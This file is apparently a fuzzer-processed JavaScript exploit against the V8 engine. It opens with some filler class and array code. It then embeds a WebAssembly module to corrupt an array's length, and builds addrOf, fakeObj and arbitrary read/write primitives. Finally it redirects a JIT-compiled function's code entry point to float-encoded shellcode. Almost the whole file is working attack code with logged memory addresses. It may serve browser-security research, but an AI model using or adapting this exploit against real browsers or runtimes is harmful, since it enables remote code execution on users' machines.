class C1 {
    static h;
    #b = true;
    static 3;
    static #n() {
        function f3() {
            return true;
        }
        f3 ?? this;
        this.length = 3;
        return f3;
    }
    static [true] = true;
    static g;
    #e;
}
const v6 = new C1();
new C1();
new C1();
new Map();
function f14() {
    return v6;
}
[3.2020673859143063,-657.0067081459729,-1e-15,8.384251363323813];
[1000000000.0,1000000000000.0,NaN,0.0,-392.09438965082643,1.0,696557.4823933037,-1000.0];
[-2.3798327601756846,-1000000.0,9.01168385828711,4.0,1e-15,-2.2250738585072014e-308,1000000.0,2.63178735627556e+307];
[554226531,4294967295,33979,-13];
[5,6,2084657790,64,9,-2147483647];
[4294967295,-2,1143328442,-8,9223372036854775807,9007199254740990];
let v23;
try { v23 = new ArrayBuffer(8); } catch (e) {}
const buf = v23;
let v26;
try { v26 = new Float64Array(buf); } catch (e) {}
const f64 = v26;
let v29;
try { v29 = new Uint32Array(buf); } catch (e) {}
const u32 = v29;
let v32;
try { v32 = new BigUint64Array(buf); } catch (e) {}
const bigUint64 = v32;
const v34 = (a35) => {
    f64[0] = a35;
    return bigUint64?.[0];
};
f2i = v34;
const v38 = (a39) => {
    bigUint64[0] = a39;
    return f64?.[0];
};
i2f = v38;
const v42 = (a43) => {
    f64[0] = a43;
    let v45;
    try { v45 = Array.from(u32); } catch (e) {}
    return v45;
};
d2u = v42;
const v47 = (a48, a49) => {
    u32[0] = a48;
    u32[1] = a49;
    return f64?.[0];
};
u2d = v47;
const v52 = (a53) => {
    let v56;
    try { v56 = a53.toString(16); } catch (e) {}
    "0x" + v56;
    return a53;
};
hex = v52;
const v309 = [0,97,115,109,1,0,0,0,1,53,7,80,0,94,127,1,80,0,95,6,127,0,127,0,127,0,127,0,127,0,107,0,0,80,0,95,1,108,1,0,96,7,127,127,127,127,127,127,127,1,127,96,0,1,127,96,0,1,127,96,0,1,127,3,5,4,3,4,5,6,4,12,1,64,0,107,2,1,2,2,251,8,2,11,6,22,4,108,0,1,208,0,11,127,1,65,0,11,127,1,65,0,11,127,1,65,0,11,7,8,1,4,109,97,105,110,0,0,10,128,1,4,78,0,65,0,37,0,251,3,2,0,251,3,1,5,36,0,32,0,36,1,32,1,36,2,32,2,36,3,16,3,4,64,32,3,36,2,32,4,36,3,16,3,4,64,32,5,36,2,32,6,36,3,16,3,4,64,35,2,15,11,11,11,35,0,35,2,65,9,106,65,128,128,1,251,22,0,35,2,11,12,0,35,0,35,2,251,19,0,35,1,107,11,14,0,35,2,65,1,106,36,2,35,2,35,3,78,11,19,0,3,64,16,2,4,64,65,1,15,11,16,1,13,0,11,65,0,11];
let v310;
try { v310 = new Uint8Array(v309); } catch (e) {}
var wasm_code = v310;
const v312 = () => {
    return [1.9711828979523134e-246,1.9562205631094693e-246,1.9557819155246427e-246,1.9711824228871598e-246,1.971182639857203e-246,1.9711829003383248e-246,d2u,1.971182898881177e-246];
};
const foo = v312;
for (let i324 = 0; i324 < 65536; i324++) {
    try { foo(); } catch (e) {}
    try { foo(); } catch (e) {}
    try { foo(); } catch (e) {}
    try { foo(); } catch (e) {}
}
const v335 = WebAssembly?.Module;
let v336;
try { v336 = new v335(wasm_code); } catch (e) {}
var wasm_module = v336;
const v338 = WebAssembly?.Instance;
let v339;
try { v339 = new v338(wasm_module); } catch (e) {}
var instance = v339;
var oobArr = [1.951234,1.951234,1.951234];
var doubleArr = [1.1,2.2,3.3,4.4];
var objArr = [doubleArr,doubleArr];
const v355 = oobArr?.length;
let v357;
try { v357 = hex(v355); } catch (e) {}
const v358 = "==> Before Wasm Hack, oobArr's length: " + v357;
try { console.log(v358); } catch (e) {}
const v370 = instance?.exports;
let v371;
try { v371 = v370.main(613252610, 65536, 327680, 589824, 847872, 393216, 520192); } catch (e) {}
let v372;
try { v372 = v371.toString(16); } catch (e) {}
const v373 = "==> Find the offset is: 0x" + v372;
try { console.log(v373); } catch (e) {}
const v376 = oobArr?.length;
let v377;
try { v377 = hex(v376); } catch (e) {}
const v378 = "==> After Wasm Hack, oobArr's length: " + v377;
try { console.log(v378); } catch (e) {}
const v380 = oobArr?.[8];
let v382;
try { v382 = d2u(v380); } catch (e) {}
let doubleMap = v382?.[0];
const v385 = oobArr?.[18];
let v386;
try { v386 = d2u(v385); } catch (e) {}
let objMap = v386?.[0];
let v390;
try { v390 = hex(doubleMap); } catch (e) {}
const v391 = "==> double_map: " + v390;
try { console.log(v391); } catch (e) {}
let v394;
try { v394 = hex(objMap); } catch (e) {}
const v395 = "==> obj_map: " + v394;
try { console.log(v395); } catch (e) {}
const v397 = (a398) => {
    objArr[0] = a398;
    let v400;
    try { v400 = BigInt(doubleMap); } catch (e) {}
    let v402;
    try { v402 = i2f(v400); } catch (e) {}
    oobArr[18] = v402;
    const v403 = objArr?.[0];
    let v404;
    try { v404 = d2u(v403); } catch (e) {}
    ret = v404;
    let v406;
    try { v406 = BigInt(objMap); } catch (e) {}
    let v407;
    try { v407 = i2f(v406); } catch (e) {}
    oobArr[18] = v407;
    return ret?.[0];
};
addrOf = v397;
let v412;
try { v412 = addrOf(doubleArr); } catch (e) {}
var fakeAddr = v412 + 48;
let v418;
try { v418 = u2d(doubleMap, 0); } catch (e) {}
doubleArr[2] = v418;
let v421;
try { v421 = u2d(0, 4096); } catch (e) {}
doubleArr[3] = v421;
const v422 = (a423) => {
    let v425;
    try { v425 = u2d(a423, 0); } catch (e) {}
    doubleArr[0] = v425;
    let v427;
    try { v427 = BigInt(objMap); } catch (e) {}
    let v429;
    try { v429 = i2f(v427); } catch (e) {}
    oobArr[8] = v429;
    var fake_obj = doubleArr?.[0];
    let v432;
    try { v432 = BigInt(doubleMap); } catch (e) {}
    let v433;
    try { v433 = i2f(v432); } catch (e) {}
    oobArr[8] = v433;
    return fake_obj;
};
fakeObj = v422;
let v436;
try { v436 = fakeObj(fakeAddr); } catch (e) {}
var fake_obj = v436;
const v438 = (a439) => {
    const v441 = a439 - 8;
    let v443;
    try { v443 = u2d(v441, 4096); } catch (e) {}
    doubleArr[3] = v443;
    const v444 = fake_obj?.[0];
    let v446;
    try { v446 = f2i(v444); } catch (e) {}
    return v446;
};
arb_r = v438;
const v448 = (a449, a450) => {
    const v452 = a449 - 8;
    let v454;
    try { v454 = u2d(v452, 4096); } catch (e) {}
    doubleArr[3] = v454;
    fake_obj[0] = a450;
};
arb_w = v448;
let v456;
try { v456 = addrOf(instance); } catch (e) {}
var instance_addr = v456;
let v458;
try { v458 = addrOf(foo); } catch (e) {}
var foo_addr = v458;
let v461;
try { v461 = hex(foo_addr); } catch (e) {}
const v462 = "==> foo_addr: " + v461;
try { console.log(v462); } catch (e) {}
const v465 = foo_addr + 24;
let v467;
try { v467 = arb_r(v465); } catch (e) {}
let v470;
try { v470 = BigInt("0xffffffff"); } catch (e) {}
var code_addr = v467 & v470;
let v474;
try { v474 = hex(code_addr); } catch (e) {}
const v475 = "==> code_addr: " + v474;
try { console.log(v475); } catch (e) {}
let v478;
try { v478 = Number(code_addr); } catch (e) {}
const v480 = v478 + 16;
let v481;
try { v481 = arb_r(v480); } catch (e) {}
var code_entry_point_addr = v481;
let v484;
try { v484 = hex(code_entry_point_addr); } catch (e) {}
const v485 = "==> code_entry_point_addr: " + v484;
try { console.log(v485); } catch (e) {}
let v487;
try { v487 = Number(code_addr); } catch (e) {}
const v489 = v487 + 16;
let v492;
try { v492 = BigInt("0x53"); } catch (e) {}
const v493 = code_entry_point_addr + v492;
let v495;
try { v495 = i2f(v493); } catch (e) {}
try { arb_w(v489, v495); } catch (e) {}
try { foo(); } catch (e) {}
